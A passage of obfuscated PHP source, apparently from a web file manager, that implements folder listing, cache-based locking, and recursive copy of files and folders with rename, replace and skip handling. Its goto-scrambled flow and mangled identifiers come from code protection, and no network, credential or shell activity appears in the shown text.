$cëˆ³ªÓƒÅ[$DÇ§½µà¹] : !1; $DÇ§½µà¹ = $a—å±›±´º[$BöŒœÈ‘İ™[375]]; $a—å±›±´º[$BöŒœÈ‘İ™[375]] = $cëˆ³ªÓƒÅ[$DÇ§½µà¹] ? $cëˆ³ªÓƒÅ[$DÇ§½µà¹] : !1; if (isset($a—å±›±´º[$BöŒœÈ‘İ™[413]]) && $a—å±›±´º[$BöŒœÈ‘İ™[413]][$BöŒœÈ‘İ™[474]]) { $B•é¨áĞ¯ = $GLOBALS[$BöŒœÈ‘İ™[6]][$BöŒœÈ‘İ™[84]][$BöŒœÈ‘İ™[475]]; if ($a—å±›±´º[$BöŒœÈ‘İ™[413]][$BöŒœÈ‘İ™[476]] <= time() - $B•é¨áĞ¯) { $this->metaSet($a—å±›±´º[$BöŒœÈ‘İ™[365]], $BöŒœÈ‘İ™[474], null); $this->metaSet($a—å±›±´º[$BöŒœÈ‘İ™[365]], $BöŒœÈ‘İ™[476], null); unset($a—å±›±´º[$BöŒœÈ‘İ™[413]][$BöŒœÈ‘İ™[474]]); continue; } $fïŒ™½ù„Ò = $a—å±›±´º[$BöŒœÈ‘İ™[413]][$BöŒœÈ‘İ™[474]]; $a—å±›±´º[$BöŒœÈ‘İ™[413]][$BöŒœÈ‘İ™[477]] = Model($BöŒœÈ‘İ™[473])->getInfoSimpleOuter($fïŒ™½ù„Ò); } } } public function parentLevelArray($DöÙ×ä‡ Á) { $aƒ¥Ô¨ƒé¿ =& $_SERVER[»„]; $DöÙ×ä‡ Á = explode($aƒ¥Ô¨ƒé¿[47], trim($DöÙ×ä‡ Á, $aƒ¥Ô¨ƒé¿[47])); return array_remove_value($DöÙ×ä‡ Á, $aƒ¥Ô¨ƒé¿[464]); } public function listAll($cùªÇ‰¢ˆ¶) { goto AÆİÒ¢È’’; AÆİÒ¢È’’: $D¶È Ğˆ…­ =& $_SERVER[»„]; $c„Ïè½é”Ğ = $this->sourceInfo($cùªÇ‰¢ˆ¶); $D™¢·ç‡» = array($D¶È Ğˆ…­[478] => array($D¶È Ğˆ…­[479], $c„Ïè½é”Ğ[$D¶È Ğˆ…­[455]] . $cùªÇ‰¢ˆ¶ . $D¶È Ğˆ…­[480]), $D¶È Ğˆ…­[481] => 0); goto bÔ¯–íâğò; e»´°¤Øä¡: $this->_listAppendAuth($dÕ¹ù°‚Ä¦); $this->_listAppendUser($dÕ¹ù°‚Ä¦); $this->_listAppendPath($dÕ¹ù°‚Ä¦); goto Aè®™¤¼Ô; bÔ¯–íâğò: $Fß¹‚±¦ãÙ = $D¶È Ğˆ…­[482]; $fÊÄ´Øßà± = "\114\105\x46\x54\x20\112\117\111\x4e\x20{$this->tablePrefix}\x69\157\x5f\146\x69\154\x65\40\146\x69\x6c\145\40\x6f\x6e\40\163\x6f\x75\162\x63\145\x2e\146\x69\x6c\x65\111\x44\40\75\x20\x66\151\154\x65\x2e\x66\151\x6c\145\x49\x44"; $dÕ¹ù°‚Ä¦ = $this->alias($D¶È Ğˆ…­[483])->field($Fß¹‚±¦ãÙ)->where($D™¢·ç‡»)->join($fÊÄ´Øßà±)->select(); goto e»´°¤Øä¡; bññ²‡…•Ë: $b›½Ê›ŸâÅ = array(); foreach ($dÕ¹ù°‚Ä¦ as $DÄÁ»£ÄÏÕ => $D®‰çƒÒ ã) { goto E¢ÀÚ™ˆĞ; cÔ”ä’¹‰: $eÖÁŒ¹è‘» = str_replace($D¶È Ğˆ…­[463], $D¶È Ğˆ…­[8], $eÖÁŒ¹è‘»); $eÖÁŒ¹è‘» = str_replace($D¶È Ğˆ…­[463], $D¶È Ğˆ…­[8], $eÖÁŒ¹è‘»); $eÃ†­¢‹ã† = array($D¶È Ğˆ…­[383] => str_replace($D¶È Ğˆ…­[463], $D¶È Ğˆ…­[8], $eÖÁŒ¹è‘»), $D¶È Ğˆ…­[484] => intval($D®‰çƒÒ ã[$D¶È Ğˆ…­[366]]), $D¶È Ğˆ…­[387] => $this->pathInfoFilter($D®‰çƒÒ ã, !0)); goto A¶»²˜Šè¡; e‡£ŒŸÜİâ: for ($f·Õ¡©‰Ş¸ = 0; $f·Õ¡©‰Ş¸ < count($dïîŠŒî¡); $f·Õ¡©‰Ş¸++) { $eÖÁŒ¹è‘» .= $dÕ¹ù°‚Ä¦[$dïîŠŒî¡[$f·Õ¡©‰Ş¸]][$D¶È Ğˆ…­[28]] . $D¶È Ğˆ…­[8]; } $eÖÁŒ¹è‘» .= $D®‰çƒÒ ã[$D¶È Ğˆ…­[28]]; if ($D®‰çƒÒ ã[$D¶È Ğˆ…­[366]]) { $eÖÁŒ¹è‘» .= $D¶È Ğˆ…­[8]; } goto cÔ”ä’¹‰; A¶»²˜Šè¡: if (!$D®‰çƒÒ ã[$D¶È Ğˆ…­[366]]) { $eÃ†­¢‹ã†[$D¶È Ğˆ…­[415]] = $D®‰çƒÒ ã[$D¶È Ğˆ…­[415]]; $eÃ†­¢‹ã†[$D¶È Ğˆ…­[485]] = $D®‰çƒÒ ã[$D¶È Ğˆ…­[75]]; } $b›½Ê›ŸâÅ[] = $eÃ†­¢‹ã†; goto bîáãä•åÁ; E¢ÀÚ™ˆĞ: $dïîŠŒî¡ = $this->parentLevelArray($D®‰çƒÒ ã[$D¶È Ğˆ…­[455]]); array_shift($dïîŠŒî¡); $eÖÁŒ¹è‘» = $b‚…¤†¡Å¨; goto e‡£ŒŸÜİâ; bîáãä•åÁ: } return $b›½Ê›ŸâÅ; goto C‰èÒéâñÉ; Aè®™¤¼Ô: $dÕ¹ù°‚Ä¦ = array_to_keyvalue($dÕ¹ù°‚Ä¦, $D¶È Ğˆ…­[365]); $b‚…¤†¡Å¨ = "\57{$c„Ïè½é”Ğ[$D¶È Ğˆ…­[28]]}\57"; $b‚…¤†¡Å¨ = $b‚…¤†¡Å¨ == $D¶È Ğˆ…­[463] ? $D¶È Ğˆ…­[8] : $b‚…¤†¡Å¨; goto bññ²‡…•Ë; C‰èÒéâñÉ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($A¹‹³ñœÑø) { goto CÃøªµ‹‡¼; CçëÇò¯Ü¶: $this->_lockEvent($A¹‹³ñœÑø, array($DË´ŠÇï‹Î[489], $DË´ŠÇï‹Î[490]), $eè¯á‚Œíº); $this->_lockCheckEnd($DË´ŠÇï‹Î[486], $A¹‹³ñœÑø); goto EëŒï»ôç; aÅĞ†Ê£Ç¦: $eè¯á‚Œíº = 1; $this->_lockEvent($A¹‹³ñœÑø, array($DË´ŠÇï‹Î[487], $DË´ŠÇï‹Î[488]), $eè¯á‚Œíº); $this->_lockParent($A¹‹³ñœÑø, array($DË´ŠÇï‹Î[488]), $eè¯á‚Œíº); goto CçëÇò¯Ü¶; CÃøªµ‹‡¼: $DË´ŠÇï‹Î =& $_SERVER[»„]; if (!$this->allowLock()) { return; } $this->_lockCheck($DË´ŠÇï‹Î[486], $A¹‹³ñœÑø); goto aÅĞ†Ê£Ç¦; EëŒï»ôç: } public function lockCopyEnd($bÑÄÍŒ°ê) { $Fİ™øğœÄ© =& $_SERVER[»„]; if (!$this->allowLock()) { return; } $D«°•Õ„´‡ = 0; $this->_lockEvent($bÑÄÍŒ°ê, array($Fİ™øğœÄ©[487], $Fİ™øğœÄ©[488]), $D«°•Õ„´‡); $this->_lockParent($bÑÄÍŒ°ê, array($Fİ™øğœÄ©[488]), $D«°•Õ„´‡); $this->_lockEvent($bÑÄÍŒ°ê, array($Fİ™øğœÄ©[489], $Fİ™øğœÄ©[490]), $D«°•Õ„´‡); } public function lockWriteStart($D—‹âÁ»‡, $D‹Ä‰Úó¸­ = '') { goto fŸ£´µ‚ˆ; D¨ÄÜîªÛ: $this->_lockParent($D—‹âÁ»‡, array($bİ£‘‡°…å[486], $bİ£‘‡°…å[488]), $cÑµÍàé˜ò); $this->_lockCheckEnd($bİ£‘‡°…å[487], $D—‹âÁ»‡); goto E ï›äé¨»; fŸ£´µ‚ˆ: $bİ£‘‡°…å =& $_SERVER[»„]; if (!$this->allowLock()) { return; } $this->_lockCheck($bİ£‘‡°…å[487], $D—‹âÁ»‡); goto bö±Ú‚¿êù; bö±Ú‚¿êù: $cÑµÍàé˜ò = 1; $this->_lockKey($bİ£‘‡°…å[491] . $D—‹âÁ»‡ . $bİ£‘‡°…å[91] . $D‹Ä‰Úó¸­, $cÑµÍàé˜ò); $this->_lockEvent($D—‹âÁ»‡, array($bİ£‘‡°…å[486], $bİ£‘‡°…å[488]), $cÑµÍàé˜ò); goto D¨ÄÜîªÛ; E ï›äé¨»: } public function lockWriteEnd($d”›’õ…Û, $aÓ¦ÀØé¯¯ = '') { $fŠ¢ÁÊÃ› =& $_SERVER[»„]; if (!$this->allowLock()) { return; } $FˆİçÉä½ = 0; $this->_lockKey($fŠ¢ÁÊÃ›[491] . $d”›’õ…Û . $fŠ¢ÁÊÃ›[91] . $aÓ¦ÀØé¯¯, $FˆİçÉä½); $this->_lockEvent($d”›’õ…Û, array($fŠ¢ÁÊÃ›[486], $fŠ¢ÁÊÃ›[488]), $FˆİçÉä½); $this->_lockParent($d”›’õ…Û, array($fŠ¢ÁÊÃ›[486], $fŠ¢ÁÊÃ›[488]), $FˆİçÉä½); } public function lockMoveStart($Díø‰Üƒ»ô) { goto fò’ÆôŸ‡; AÇ¹‹òÓÕ¥: $this->_lockParent($Díø‰Üƒ»ô, array($fƒŒ†£‘[486], $fƒŒ†£‘[488]), $eó«Å¬ğ³œ); $this->_lockEvent($Díø‰Üƒ»ô, array($fƒŒ†£‘[493], $fƒŒ†£‘[489], $fƒŒ†£‘[490]), $eó«Å¬ğ³œ); $this->_lockCheckEnd($fƒŒ†£‘[488], $Díø‰Üƒ»ô); goto C¼ÜÎ ˜ˆÍ; DÖ²©Ô¨: $eó«Å¬ğ³œ = 1; $this->_lockKey($fƒŒ†£‘[492] . $Díø‰Üƒ»ô, $eó«Å¬ğ³œ); $this->_lockEvent($Díø‰Üƒ»ô, array($fƒŒ†£‘[486], $fƒŒ†£‘[487]), $eó«Å¬ğ³œ); goto AÇ¹‹òÓÕ¥; fò’ÆôŸ‡: $fƒŒ†£‘ =& $_SERVER[»„]; if (!$this->allowLock()) { return; } $this->_lockCheck($fƒŒ†£‘[488], $Díø‰Üƒ»ô); goto DÖ²©Ô¨; C¼ÜÎ ˜ˆÍ: } public function lockMoveEnd($f²ã«è¡Œ”) { goto dœ™à¯É¨Ó; C ¤÷Õº: $this->_lockKey($dÆÊ¿Í÷ëî[492] . $f²ã«è¡Œ”, $f‹—ç…¤); $this->_lockEvent($f²ã«è¡Œ”, array($dÆÊ¿Í÷ëî[486], $dÆÊ¿Í÷ëî[487]), $f‹—ç…¤); $this->_lockParent($f²ã«è¡Œ”, array($dÆÊ¿Í÷ëî[486], $dÆÊ¿Í÷ëî[488]), $f‹—ç…¤); goto Aô‘¢°İ¾à; dœ™à¯É¨Ó: $dÆÊ¿Í÷ëî =& $_SERVER[»„]; if (!$this->allowLock()) { return; } $f‹—ç…¤ = 0; goto C ¤÷Õº; Aô‘¢°İ¾à: $this->_lockEvent($f²ã«è¡Œ”, array($dÆÊ¿Í÷ëî[493], $dÆÊ¿Í÷ëî[489], $dÆÊ¿Í÷ëî[490]), $f‹—ç…¤); goto Fò‰Ì¥í; Fò‰Ì¥í: } private function _lockCheck($CÔÂ›‡—Ã, $EåõÇ’¢ƒ) { goto EšÓªàâ°—; e×ù†ĞÍãˆ: $BòñÁ»·ß = array_reverse($this->parentLevelArray($C–‚†‰ñŞ[$E—ìÃËãÍ[455]])); foreach ($BòñÁ»·ß as $F”óõˆÊãŠ) { $EàÍƒ«œ ½ = $CÔÂ›‡—Ã . $E—ìÃËãÍ[495] . $F”óõˆÊãŠ; if (CacheLock::lockGet($E—ìÃËãÍ[496] . $EàÍƒ«œ ½)) { $C–‚†‰ñŞ = $this->sourceInfo($F”óõˆÊãŠ); CacheLock::setErrorMsg($E—ìÃËãÍ[153] . htmlspecialchars($C–‚†‰ñŞ[$E—ìÃËãÍ[28]]) . $E—ìÃËãÍ[472] . $C—öÂ©°‡); $this->_lockKey($EàÍƒ«œ ½, 1); $this->_lockKey($EàÍƒ«œ ½, 0); } } goto C…İÊ°º; dÂŸ½³›È: CacheLock::setErrorMsg($E—ìÃËãÍ[153] . htmlspecialchars($C–‚†‰ñŞ[$E—ìÃËãÍ[28]]) . $E—ìÃËãÍ[472] . $C—öÂ©°‡); $this->_lockKey($EàÍƒ«œ ½, 1); $this->_lockKey($EàÍƒ«œ ½, 0); goto e×ù†ĞÍãˆ; EšÓªàâ°—: $E—ìÃËãÍ =& $_SERVER[»„]; $C–‚†‰ñŞ = $this->sourceInfo($EåõÇ’¢ƒ); $EàÍƒ«œ ½ = $CÔÂ›‡—Ã . $E—ìÃËãÍ[91] . $EåõÇ’¢ƒ; goto dÎ´É„; dÎ´É„: $this->_lockTimeStart[$EàÍƒ«œ ½] = timeFloat(); if (!is_array($C–‚†‰ñŞ)) { return; } $C—öÂ©°‡ = LNG($E—ìÃËãÍ[494]); goto dÂŸ½³›È; C…İÊ°º: } private function _lockCheckEnd($E‹Ç—ÀÕÈ, $dÂâóë·çÚ) { goto f¾Â¨¿ƒ§«; f¾Â¨¿ƒ§«: $d¾“¯Ê•…ù =& $_SERVER[»„]; $c½ÈÚàÃÂ‡ = $E‹Ç—ÀÕÈ . $d¾“¯Ê•…ù[91] . $dÂâóë·çÚ; CacheLock::setErrorMsg($d¾“¯Ê•…ù[357]); goto cØõ’‚é§; bé¸“Ò«ë•: if ($D²“¤ãÊ´ > 0.5) { unset(self::$cacheSourceInfo[$d¾“¯Ê•…ù[406] . $dÂâóë·çÚ]); } $CÁµßßÊœµ = $this->sourceInfo($dÂâóë·çÚ); if (!$CÁµßßÊœµ) { show_json(LNG($d¾“¯Ê•…ù[100]), !1); } goto f±²ì œÉ¶; cØõ’‚é§: if (!isset($this->_lockTimeStart[$c½ÈÚàÃÂ‡])) { return; } $D²“¤ãÊ´ = timeFloat() - $this->_lockTimeStart[$c½ÈÚàÃÂ‡]; unset($this->_lockTimeStart[$c½ÈÚàÃÂ‡]); goto bé¸“Ò«ë•; f±²ì œÉ¶: } private function _lockParent($B‹¨øÁ„²•, $Fäô£ØÄ“Æ, $B„‹çÃ›÷) { if (!$this->autoLockSet) { return; } $Bó·½¥¯‰Œ = $this->sourceInfo($B‹¨øÁ„²•); if (!is_array($Bó·½¥¯‰Œ)) { return; } $f©øâ­Õ¹ = array_reverse($this->parentLevelArray($Bó·½¥¯‰Œ[$_SERVER[»„][455]])); foreach ($f©øâ­Õ¹ as $E¥‰Ûà‰‘ï) { $this->_lockEvent($E¥‰Ûà‰‘ï, $Fäô£ØÄ“Æ, $B„‹çÃ›÷); } } private function _lockEvent($A£¤ª§ïÒ, $D££ÎĞãòÃ, $DËÀŞÑŒº) { $e‰­ç™ğòï =& $_SERVER[»„]; if (!$this->autoLockSet) { return; } foreach ($D££ÎĞãòÃ as $c‡Ï…©È“‚) { $a°ë¤è‹Ş½ = $c‡Ï…©È“‚ . $e‰­ç™ğòï[91] . $A£¤ª§ïÒ; if ($DËÀŞÑŒº && CacheLock::lockGet($e‰­ç™ğòï[496] . $a°ë¤è‹Ş½)) { continue; } $this->_lockKey($a°ë¤è‹Ş½, $DËÀŞÑŒº); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($F ÒôŞç†î, $E¨»¦Äõ‹¶ = 1) { $aî–òØ¤åš = $_SERVER[»„][496] . md5($F ÒôŞç†î); if ($E¨»¦Äõ‹¶) { if (isset(self::$_lockItemArr[$aî–òØ¤åš])) { return; } self::$_lockItemArr[$aî–òØ¤åš] = 1; CacheLock::lock($aî–òØ¤åš, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$aî–òØ¤åš])) { return; } unset(self::$_lockItemArr[$aî–òØ¤åš]); CacheLock::unlock($aî–òØ¤åš); } } public function isParentOf($AÊ‡â‚‹Ìè, $bïğëÓÀÑš) { goto c£íœ„ƒ¶š; c£íœ„ƒ¶š: $FÚ¸ÔÄíÊŒ =& $_SERVER[»„]; $f¬¾äÉ‘œÊ = $this->sourceInfo($AÊ‡â‚‹Ìè); $E—¹Í‚¼¬æ = $this->sourceInfo($bïğëÓÀÑš); goto FˆÉèôæ±Æ; Bë½ò¹ÜÂ·: return $Eğ÷†Œ£¢; goto A©®±äÈË; FˆÉèôæ±Æ: $dÖª‡Ãó±ó = $f¬¾äÉ‘œÊ[$FÚ¸ÔÄíÊŒ[455]] . $f¬¾äÉ‘œÊ[$FÚ¸ÔÄíÊŒ[365]] . $FÚ¸ÔÄíÊŒ[47]; $F×‡Îİğ¾ = $E—¹Í‚¼¬æ[$FÚ¸ÔÄíÊŒ[455]] . $E—¹Í‚¼¬æ[$FÚ¸ÔÄíÊŒ[365]] . $FÚ¸ÔÄíÊŒ[47]; $Eğ÷†Œ£¢ = strpos($F×‡Îİğ¾, $dÖª‡Ãó±ó) === 0; goto Bë½ò¹ÜÂ·; A©®±äÈË: } private $targetIsDelete = 0; public function copy($F º„èŸ÷Ê, $BÈ³§ö‰¾õ, $Aæ“ğãÑ‹ = REPEAT_REPLACE, $Bë†‡‹Õ‚ = '') { goto F‰Ï¶‚â½Ú; b¿—„îÖâ: $this->targetIsDelete = intval($F¹óÕˆŠ˜•[$Bô¨•Ç‰ÒÙ[393]]); $C» ¬ŒÕÒñ = $this->fileNameExistCache($BÈ³§ö‰¾õ, $F¹óÕˆŠ˜•[$Bô¨•Ç‰ÒÙ[28]]); $c²å¦è¶¼¤ = $this->_copy($F º„èŸ÷Ê, $BÈ³§ö‰¾õ, $Aæ“ğãÑ‹, $F³ëìÃßæë, !0, $Bë†‡‹Õ‚); goto D¦ã…ÑÓé; EÃí®…÷±Ô: $this->updateModifyTime($BÈ³§ö‰¾õ); return $c²å¦è¶¼¤; goto Eå‰¼Ü¦; DÒ½èÕ½¿: $this->lockCopyStart($F º„èŸ÷Ê); $this->lockWriteStart($BÈ³§ö‰¾õ, $eÇµ¦çé´); $F³ëìÃßæë = array($Bô¨•Ç‰ÒÙ[497] => array(), $Bô¨•Ç‰ÒÙ[498] => array(), $Bô¨•Ç‰ÒÙ[499] => array()); goto b¿—„îÖâ; F‰Ï¶‚â½Ú: $Bô¨•Ç‰ÒÙ =& $_SERVER[»„]; $F¹óÕˆŠ˜• = $this->sourceInfo($F º„èŸ÷Ê); $DÛ“èèøµ— = $this->sourceInfo($BÈ³§ö‰¾õ); goto f¼¿¹–§ä¸; D¦ã…ÑÓé: $this->_childrenListClear(); $this->lockCopyEnd($F º„èŸ÷Ê); $this->lockWriteEnd($BÈ³§ö‰¾õ, $eÇµ¦çé´); goto B„¨ãÔäø™; cøÂÁ×íå±: $this->saveAll($F³ëìÃßæë[$Bô¨•Ç‰ÒÙ[499]]); Model($Bô¨•Ç‰ÒÙ[163])->linkAdd($F³ëìÃßæë[$Bô¨•Ç‰ÒÙ[497]]); $this->folderSizeReset($BÈ³§ö‰¾õ); goto EÃí®…÷±Ô; B„¨ãÔäø™: if ($F¹óÕˆŠ˜•[$Bô¨•Ç‰ÒÙ[366]] == $Bô¨•Ç‰ÒÙ[83] && $C» ¬ŒÕÒñ == $c²å¦è¶¼¤) { $this->folderSizeResetChildren($C» ¬ŒÕÒñ); } Model($Bô¨•Ç‰ÒÙ[500])->addAll($F³ëìÃßæë[$Bô¨•Ç‰ÒÙ[498]], array(), !0); if ($C» ¬ŒÕÒñ != $c²å¦è¶¼¤ || $F¹óÕˆŠ˜•[$Bô¨•Ç‰ÒÙ[366]] == $Bô¨•Ç‰ÒÙ[83]) { Model($Bô¨•Ç‰ÒÙ[501])->eventCopy($c²å¦è¶¼¤); } goto cøÂÁ×íå±; f¼¿¹–§ä¸: if (!$F¹óÕˆŠ˜• || !$DÛ“èèøµ— || $DÛ“èèøµ—[$Bô¨•Ç‰ÒÙ[366]] != $Bô¨•Ç‰ÒÙ[83]) { return !1; } if ($this->isParentOf($F º„èŸ÷Ê, $BÈ³§ö‰¾õ)) { return !1; } $eÇµ¦çé´ = $Bë†‡‹Õ‚ ? $Bë†‡‹Õ‚ : $F¹óÕˆŠ˜•[$Bô¨•Ç‰ÒÙ[28]]; goto DÒ½èÕ½¿; Eå‰¼Ü¦: } private function _copy($A…î°¢†, $aš‰«×­ˆ, $CôÏÕ¼¨«İ, &$C÷·´“Ï¯, $eù²Öƒ‰¦ß, $bœéÔ‡ß„Ñ = '') { goto cÑäáõğ˜; câ¸Şë«¯Æ: return $CãÄóˆÂµ; goto a­ìî×¾»ª; D©’´ÃîÚğ: if (!$dŒøÍ–Œå‚) { return $this->_copyCreate($A…î°¢†, $aš‰«×­ˆ, $D–ëàÔ¬ŠŒ, $C÷·´“Ï¯); } $CãÄóˆÂµ = $dŒøÍ–Œå‚; if ($eÄ³µµ”ëô) { if ($CôÏÕ¼¨«İ == REPEAT_RENAME_FOLDER) { $D–ëàÔ¬ŠŒ = $this->fileNameAutoCache($aš‰«×­ˆ, $D–ëàÔ¬ŠŒ, $CôÏÕ¼¨«İ, $eÄ³µµ”ëô); $CãÄóˆÂµ = $this->_copyCreate($A…î°¢†, $aš‰«×­ˆ, $D–ëàÔ¬ŠŒ, $C÷·´“Ï¯); } else { $a¡Ò²Šá•Ö = $this->_childrenList($A…î°¢†); foreach ($a¡Ò²Šá•Ö as $FùÑğœºø) { $this->_copy($FùÑğœºø[$F¸Æ£ŞÕ”[365]], $dŒøÍ–Œå‚, $CôÏÕ¼¨«İ, $C÷·´“Ï¯, !1); } } } else { if ($CôÏÕ¼¨«İ == REPEAT_RENAME || $CôÏÕ¼¨«İ == REPEAT_RENAME_FOLDER) { $D–ëàÔ¬ŠŒ = $this->fileNameAutoCache($aš‰«×­ˆ, $D–ëàÔ¬ŠŒ, $CôÏÕ¼¨«İ, $eÄ³µµ”ëô); $CãÄóˆÂµ = $this->_copyCreate($A…î°¢†, $aš‰«×­ˆ, $D–ëàÔ¬ŠŒ, $C÷·´“Ï¯); } else { if ($CôÏÕ¼¨«İ == REPEAT_REPLACE) { $aéœ¯Ğæ„¿ = $this->sourceInfoCache($dŒøÍ–Œå‚); $bÉØØ¨éôğ = $this->fileHistory($aéœ¯Ğæ„¿, $D¿ƒğ°»éÆ[$F¸Æ£ŞÕ”[415]], $D¿ƒğ°»éÆ[$F¸Æ£ŞÕ”[77]]); if ($bÉØØ¨éôğ) { $C÷·´“Ï¯[$F¸Æ£ŞÕ”[497]][] = $D¿ƒğ°»éÆ[$F¸Æ£ŞÕ”[415]]; } } else { if ($CôÏÕ¼¨«İ == REPEAT_SKIP) { } } } Hook::trigger($F¸Æ£ŞÕ”[502], array($F¸Æ£ŞÕ”[503], $D¿ƒğ°»éÆ, 0)); } goto câ¸Şë«¯Æ; FÎÊ¤’–“Š: $D–ëàÔ¬ŠŒ = $bœéÔ‡ß„Ñ ? $bœéÔ‡ß„Ñ : $D¿ƒğ°»éÆ[$F¸Æ£ŞÕ”[28]]; $dŒøÍ–Œå‚ = $this->fileNameExistCache($aš‰«×­ˆ, $D–ëàÔ¬ŠŒ); if ($eù²Öƒ‰¦ß) { $this->_childrenAllMake($A…î°¢†); if ($eÄ³µµ”ëô && $dŒøÍ–Œå‚) { $this->_childrenAllMake($dŒøÍ–Œå‚); } } goto D©’´ÃîÚğ; cÑäáõğ˜: $F¸Æ£ŞÕ” =& $_SERVER[»„]; $D¿ƒğ°»éÆ = $this->sourceInfoCache($A…î°¢†); $eÄ³µµ”ëô = $D¿ƒğ°»éÆ[$F¸Æ£ŞÕ”[366]] == $F¸Æ£ŞÕ”[83]; goto FÎÊ¤’–“Š; a­ìî×¾»ª: } private function _copyCreate($BÔæ¥Ù«ÉÏ, $D”¯ƒ£Ìš, $Fõ¼ºÑÉ³å, &$BÂïÈ™‚¬Ò) { goto e¤‡Èö²£; dì™ÓëõÒ—: $this->addAll($D‹¬®„Ë­, array(), !1); $BéŞßÒÍå¼ = $this->where(array($bÜôà­ƒœù[457] => $e‚ŞÅ ¡Ö¸))->select(); $cß•ŒæñÙ = $this->_childrenMakeRelation($d†›µÇ–ä›, $BéŞßÒÍå¼); goto Dá¡ “ç; DÏ÷¹Îô…š: $fíÉ÷º­¸ = $this->sourceInfo($e‚ŞÅ ¡Ö¸); foreach ($d†›µÇ–ä› as $d“¼Å°èÓÁ) { $bÏ‚ß˜Ú»» = $this->_makeItemData($d“¼Å°èÓÁ, $fíÉ÷º­¸, $d“¼Å°èÓÁ[$bÜôà­ƒœù[28]]); $bÏ‚ß˜Ú»»[$bÜôà­ƒœù[455]] = $d“¼Å°èÓÁ[$bÜôà­ƒœù[455]]; $D‹¬®„Ë­[] = $bÏ‚ß˜Ú»»; } $this->chunkEventSet($bÜôà­ƒœù[507], array($bÜôà­ƒœù[508], $e²¬¼‡Ø—½, $Cºˆ ªî¥¡)); goto dì™ÓëõÒ—; B©·ó†’‘Ï: if ($F» Éî“ƒŒ[$bÜôà­ƒœù[366]] != $bÜôà­ƒœù[83]) { $BÂïÈ™‚¬Ò[$bÜôà­ƒœù[497]][] = $F» Éî“ƒŒ[$bÜôà­ƒœù[415]]; return $e‚ŞÅ ¡Ö¸; } $d†›µÇ–ä› = array(); $D‹¬®„Ë­ = array(); goto D©´Şø ÄÔ; aø¨¿Äóéñ: foreach ($BéŞßÒÍå¼ as $d“¼Å°èÓÁ) { $Dœ«§Ú’È = $d“¼Å°èÓÁ[$bÜôà­ƒœù[365]]; $CÄïì†šœÜ = $this->_childrenMatch($cß•ŒæñÙ, $d“¼Å°èÓÁ, $fíÉ÷º­¸); $bÉ¾ì›÷ğ’[] = array($bÜôà­ƒœù[365], $Dœ«§Ú’È, $bÜôà­ƒœù[457], $CÄïì†šœÜ[$bÜôà­ƒœù[457]]); $B¦‘¯õø”[] = array($bÜôà­ƒœù[365], $Dœ«§Ú’È, $bÜôà­ƒœù[455], $CÄïì†šœÜ[$bÜôà­ƒœù[455]]); $this->_copyApplyMeta($d“¼Å°èÓÁ, $BÂïÈ™‚¬Ò); if ($d“¼Å°èÓÁ[$bÜôà­ƒœù[366]] != $bÜôà­ƒœù[83]) { $BÂïÈ™‚¬Ò[$bÜôà­ƒœù[497]][] = $d“¼Å°èÓÁ[$bÜôà­ƒœù[415]]; } } $this->chunkEventSet($bÜôà­ƒœù[509], array($bÜôà­ƒœù[510], $e²¬¼‡Ø—½, $Cºˆ ªî¥¡)); $this->saveAll($bÉ¾ì›÷ğ’); goto dˆàìÑâÜ; D©´Şø ÄÔ: $this->_childrenListAll($BÔæ¥Ù«ÉÏ, $d†›µÇ–ä›); $Cºˆ ªî¥¡ = count($d†›µÇ–ä›); if ($Cºˆ ªî¥¡ == 0) { return $e‚ŞÅ ¡Ö¸; } goto DÏ÷¹Îô…š; Dá¡ “ç: $cß•ŒæñÙ[$BÔæ¥Ù«ÉÏ] = $e‚ŞÅ ¡Ö¸; $bÉ¾ì›÷ğ’ = array(); $B¦‘¯õø” = array(); goto aø¨¿Äóéñ; BÄ³ØßÎ: $e²¬¼‡Ø—½ = $this->_makeItemData($F» Éî“ƒŒ, $AîÑ¨ã…¾, $Fõ¼ºÑÉ³å); Hook::trigger($bÜôà­ƒœù[504], $e²¬¼‡Ø—½); Hook::trigger($bÜôà­ƒœù[505], array($bÜôà­ƒœù[506], $e²¬¼‡Ø—½, 0)); goto DÑ¢á¡µä; e¤‡Èö²£: $bÜôà­ƒœù =& $_SERVER[»„]; $F» Éî“ƒŒ = $this->sourceInfoCache($BÔæ¥Ù«ÉÏ); $AîÑ¨ã…¾ = $this->sourceInfoCache($D”¯ƒ£Ìš); goto BÄ³ØßÎ; DÑ¢á¡µä: $e‚ŞÅ ¡Ö¸ = $this->add($e²¬¼‡Ø—½); $eÃ»»Ó÷À« = array($bÜôà­ƒœù[365] => $e‚ŞÅ ¡Ö¸, $bÜôà­ƒœù[28] => $Fõ¼ºÑÉ³å); $this->_copyApplyMeta($eÃ»»Ó÷À«, $BÂïÈ™‚¬Ò); goto B©·ó†’‘Ï; dˆàìÑâÜ: $this->chunkEventSet($bÜôà­ƒœù[511], array($bÜôà­ƒœù[512], $e²¬¼‡Ø—½, $Cºˆ ªî¥¡)); $this->saveAll($B¦‘¯õø”); return $e‚ŞÅ ¡Ö¸; goto dÛ´°µè¸; dÛ´°µè¸: } private function _childrenMakeRelation($C²¸ˆëˆ, $b«¥¬¡êâÉ) { $A•õ”õÒäŒ =& $_SERVER[»„]; $A¹µ­¢’ÍŠ = array(); $d´ÔÒ˜ó·ñ = array(); foreach ($C²¸ˆëˆ as $a×„…éå¡) { $Dõ‘Æ—Úš„ = $a×„…éå¡[$A•õ”õÒäŒ[28]] . $A•õ”õÒäŒ[8] . $a×„…éå¡[$A•õ”õÒäŒ[455]]; $A¹µ­¢’ÍŠ[$Dõ‘Æ—Úš„] = $a×„…éå¡[$A•õ”õÒäŒ[365]]; } foreach ($b«¥¬¡êâÉ as $a×„…éå¡) { $Dõ‘Æ—Úš„ = $a×„…éå¡[$A•õ”õÒäŒ[28]] . $A•õ”õÒäŒ[8] . $a×„…éå¡[$A•õ”õÒäŒ[455]]; $F„ïìó­… = $A¹µ­¢’ÍŠ[$Dõ‘Æ—Úš„]; $d´ÔÒ˜ó·ñ[$F„ïìó­…] = $a×„…éå¡[$A•õ”õÒäŒ[365]]; } return $d´ÔÒ˜ó·ñ; } private function _childrenMatch($aßËßäµØÜ, $fÆä¼‹¦“±, $c´Ø’‹àŠ) { goto CÙ‘òÙ±ö; CÙ‘òÙ±ö: $Dª´¢ÈŠ¸© =& $_SERVER[»„]; $eµùêÚ‹Ó = 